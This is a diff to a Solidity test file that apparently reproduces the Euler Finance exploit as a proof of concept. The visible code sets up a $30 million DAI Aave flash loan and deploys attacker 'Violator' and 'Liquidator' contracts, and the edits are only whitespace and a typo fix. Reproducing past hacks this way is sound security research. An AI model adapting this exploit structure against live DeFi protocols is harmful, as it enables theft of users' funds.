@@ -41,13 +41,14 @@ contract EulerFinancePoC is Test {
     function testExploit() public {
         console.log("Attacker balance before exploit:", DAI.balanceOf(address(this))/1e18, IERC20(DAI).symbol());
         console.log(" ");
+
         // 1. Flash loan $30 million DAI
         uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
         // setup the flashLoan arguments
         // array of the asset(s) to flashloan
         address[] memory assets = new address[](1);
         assets[0] = address(DAI);
-        // array cointaining the amount(s) of token(s) to flashLoan
+        // array containing the amount(s) of token(s) to flashLoan
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = aaveFlashLoanAmount;
         // modes: the types of debt position to open if the flashloan is not returned.
@@ -79,6 +80,7 @@ contract EulerFinancePoC is Test {
     ) external returns (bool) {
         // approve aave to spend DAI
         DAI.approve(address(aaveV2), type(uint256).max);
+
         // 2. deploy two contracts
         violator = new Violator(DAI, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS, person);
         liquidator = new Liquidator(DAI, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS);
